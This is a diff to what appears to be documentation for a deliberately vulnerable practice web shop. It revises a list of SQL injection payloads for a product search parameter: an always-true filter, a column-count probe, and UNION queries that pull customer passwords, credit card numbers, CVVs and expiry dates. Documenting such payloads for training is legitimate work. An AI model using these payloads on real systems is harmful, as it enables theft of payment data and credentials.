@@ -126,14 +126,19 @@ tech-hub/
 /techhub/products?search=' OR '1'='1
 ```
 
-**SQL Injection - Column Enumeration:**
+**SQL Injection - Column Enumeration (8 columns in products table):**
 ```
-/techhub/products?search=' UNION SELECT null,null,null,null,null,null,null --
+/techhub/products?search=' UNION SELECT null,null,null,null,null,null,null,null --
 ```
 
-**SQL Injection - Data Exfiltration:**
+**SQL Injection - Data Exfiltration (Extract Customer Data):**
 ```
-/techhub/products?search=' UNION SELECT id,username,email,credit_card,cvv,expiration,null FROM customers --
+/techhub/products?search=' UNION SELECT id,username,password,email,credit_card,cvv,expiration,null FROM customers --
+```
+
+**SQL Injection - Extract Specific Customer Fields:**
+```
+/techhub/products?search=' UNION SELECT id,username,email,full_name,credit_card,cvv,expiration,created_at FROM customers --
 ```
 
 ### Login Bypass
